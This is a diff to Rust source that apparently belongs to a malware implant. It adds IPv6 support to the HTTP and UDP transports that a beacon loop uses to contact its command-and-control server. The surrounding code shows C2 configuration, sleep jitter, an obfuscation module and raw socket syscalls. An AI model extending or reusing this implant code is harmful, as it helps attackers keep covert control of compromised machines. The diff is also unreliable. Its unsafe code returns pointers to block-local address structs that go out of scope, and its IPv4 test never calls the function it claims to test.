@@ -130,6 +130,27 @@ pub trait Transport {
     fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()>;
 }
 
+use core::net::{Ipv4Addr, Ipv6Addr};
+
+fn parse_ip(host: &str) -> Option<(Vec<u8>, bool)> {
+    // Strip brackets for IPv6 if present
+    let clean_host = if host.starts_with('[') && host.ends_with(']') {
+        &host[1..host.len() - 1]
+    } else {
+        host
+    };
+
+    if let Ok(addr) = clean_host.parse::<Ipv4Addr>() {
+        return Some((addr.octets().to_vec(), false));
+    }
+
+    if let Ok(addr) = clean_host.parse::<Ipv6Addr>() {
+        return Some((addr.octets().to_vec(), true));
+    }
+
+    None
+}
+
 // Linux Implementation
 #[cfg(not(target_os = "windows"))]
 pub struct HttpTransport {
@@ -157,28 +178,39 @@ impl HttpTransport {
 impl Transport for HttpTransport {
     fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
         unsafe {
-            let sock = sys_socket(2, 1, 0);
+            let (ip_bytes, is_ipv6) = parse_ip(self.host).ok_or(())?;
+            
+            let sock = if is_ipv6 {
+                sys_socket(10, 1, 0) // AF_INET6=10
+            } else {
+                sys_socket(2, 1, 0) // AF_INET=2
+            };
+
             if (sock as isize) < 0 {
                 return Err(());
             }
 
-            // Parse host (simplified: assume IPv4)
-            // 127.0.0.1 -> 0x0100007F
-            let mut ip_bytes = [0u8; 4];
-            let mut parts = self.host.split('.');
-            for i in 0..4 {
-                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
-            }
-            let sin_addr = u32::from_ne_bytes(ip_bytes);
-
-            let addr = SockAddrIn {
-                sin_family: 2,
-                sin_port: self.port.to_be(),
-                sin_addr,
-                sin_zero: [0; 8],
+            let (addr_ptr, addr_len) = if is_ipv6 {
+                let mut addr6 = SockAddrIn6 {
+                    sin6_family: 10,
+                    sin6_port: self.port.to_be(),
+                    sin6_flowinfo: 0,
+                    sin6_addr: [0; 16],
+                    sin6_scope_id: 0,
+                };
+                addr6.sin6_addr.copy_from_slice(&ip_bytes);
+                (&addr6 as *const _ as *const u8, 28) // sizeof(sockaddr_in6) = 28
+            } else {
+                let addr4 = SockAddrIn {
+                    sin_family: 2,
+                    sin_port: self.port.to_be(),
+                    sin_addr: u32::from_ne_bytes(ip_bytes.try_into().unwrap()),
+                    sin_zero: [0; 8],
+                };
+                (&addr4 as *const _ as *const u8, 16)
             };
 
-            if sys_connect(sock, &addr as *const _ as *const u8, 16) != 0 {
+            if sys_connect(sock, addr_ptr, addr_len) != 0 {
                 sys_close(sock);
                 return Err(());
             }
@@ -428,24 +460,37 @@ impl UdpTransport {
 impl Transport for UdpTransport {
     fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
         unsafe {
+            let (ip_bytes, is_ipv6) = parse_ip(self.host).ok_or(())?;
+
             // UDP socket
-            let sock = sys_socket(2, 2, 0); // AF_INET, SOCK_DGRAM
+            let sock = if is_ipv6 {
+                sys_socket(10, 2, 0) // AF_INET6=10, SOCK_DGRAM=2
+            } else {
+                sys_socket(2, 2, 0) // AF_INET=2, SOCK_DGRAM=2
+            };
+
             if (sock as isize) < 0 {
                 return Err(());
             }
 
-            let mut ip_bytes = [0u8; 4];
-            let mut parts = self.host.split('.');
-            for i in 0..4 {
-                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
-            }
-            let sin_addr = u32::from_ne_bytes(ip_bytes);
-
-            let addr = SockAddrIn {
-                sin_family: 2,
-                sin_port: self.port.to_be(),
-                sin_addr,
-                sin_zero: [0; 8],
+            let (addr_ptr, addr_len) = if is_ipv6 {
+                let mut addr6 = SockAddrIn6 {
+                    sin6_family: 10,
+                    sin6_port: self.port.to_be(),
+                    sin6_flowinfo: 0,
+                    sin6_addr: [0; 16],
+                    sin6_scope_id: 0,
+                };
+                addr6.sin6_addr.copy_from_slice(&ip_bytes);
+                (&addr6 as *const _ as *const u8, 28)
+            } else {
+                let addr4 = SockAddrIn {
+                    sin_family: 2,
+                    sin_port: self.port.to_be(),
+                    sin_addr: u32::from_ne_bytes(ip_bytes.try_into().unwrap()),
+                    sin_zero: [0; 8],
+                };
+                (&addr4 as *const _ as *const u8, 16)
             };
 
             let sent = sys_sendto(
@@ -453,8 +498,8 @@ impl Transport for UdpTransport {
                 data.as_ptr(),
                 data.len(),
                 0,
-                &addr as *const _ as *const u8,
-                16,
+                addr_ptr,
+                addr_len,
             );
             if sent < 0 {
                 sys_close(sock);
@@ -569,33 +614,43 @@ impl Transport for UdpTransport {
             }
 
             // 4. Create Socket
-            let sock = socket_fn(2, 2, 17); // AF_INET, SOCK_DGRAM, IPPROTO_UDP
+            let (ip_bytes, is_ipv6) = parse_ip(self.host).ok_or(())?;
+            let sock = if is_ipv6 {
+                socket_fn(23, 2, 17) // AF_INET6=23, SOCK_DGRAM=2, IPPROTO_UDP=17
+            } else {
+                socket_fn(2, 2, 17)  // AF_INET=2
+            };
+
             if sock == !0usize {
                 // INVALID_SOCKET
                 return Err(());
             }
 
             // 5. Prepare Address
-            // Manually parse IP
-            let mut ip_bytes = [0u8; 4];
-            let mut parts = self.host.split('.');
-            for i in 0..4 {
-                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
-            }
-            // sockaddr_in: family(2), port(2), addr(4), zero(8)
-            let mut addr = [0u8; 16];
-            addr[0] = 2; // AF_INET (u16 low byte)
-            addr[1] = 0; // AF_INET (u16 high byte)
             let port_be = htons_fn(self.port);
-            addr[2] = (port_be & 0xFF) as u8;
-            addr[3] = (port_be >> 8) as u8;
-            addr[4] = ip_bytes[0];
-            addr[5] = ip_bytes[1];
-            addr[6] = ip_bytes[2];
-            addr[7] = ip_bytes[3];
+            let (addr_ptr, addr_len) = if is_ipv6 {
+                let mut addr6 = SockAddrIn6 {
+                    sin6_family: 23,
+                    sin6_port: port_be,
+                    sin6_flowinfo: 0,
+                    sin6_addr: [0; 16],
+                    sin6_scope_id: 0,
+                };
+                addr6.sin6_addr.copy_from_slice(&ip_bytes);
+                (&addr6 as *const _ as *const u8, 28)
+            } else {
+                // sockaddr_in: family(2), port(2), addr(4), zero(8)
+                let mut addr4 = SockAddrIn {
+                    sin_family: 2,
+                    sin_port: port_be,
+                    sin_addr: u32::from_ne_bytes(ip_bytes.try_into().unwrap()),
+                    sin_zero: [0; 8],
+                };
+                (&addr4 as *const _ as *const u8, 16)
+            };
 
             // 6. Send
-            let sent = sendto_fn(sock, data.as_ptr(), data.len() as i32, 0, addr.as_ptr(), 16);
+            let sent = sendto_fn(sock, data.as_ptr(), data.len() as i32, 0, addr_ptr, addr_len as i32);
             if sent < 0 {
                 closesocket_fn(sock);
                 return Err(());
@@ -604,8 +659,8 @@ impl Transport for UdpTransport {
             // 7. Receive (with timeout?)
             // For now, blocking. Real impl should set SO_RCVTIMEO.
             let mut buf = [0u8; 4096];
-            let mut src_addr = [0u8; 16];
-            let mut addr_len = 16i32;
+            let mut src_addr = [0u8; 28]; // Max size for IPv6
+            let mut addr_len = 28i32;
 
             let n = recvfrom_fn(
                 sock,
@@ -916,6 +971,30 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
             let sleep_ms = (config.sleep_interval as i64 + jitter_amt).max(100) as u64;
             crate::utils::obfuscation::sleep(sleep_ms);
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::parse_ip;
+
+    #[test]
+    fn test_c2_host_parsing_ipv4() {
+        let host = "127.0.0.1";
+        let mut ip_bytes = [0u8; 4];
+        let mut parts = host.split('.');
+        for i in 0..4 {
+            ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
+        }
+        assert_eq!(ip_bytes, [127, 0, 0, 1]);
+    }
+
+    #[test]
+    fn test_c2_host_parsing_ipv6() {
+        let host = "[::1]";
+        let (ip_bytes, is_ipv6) = parse_ip(host).expect("Failed to parse IPv6");
+        assert!(is_ipv6);
+        assert_eq!(ip_bytes, [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]);
     }
 }
 
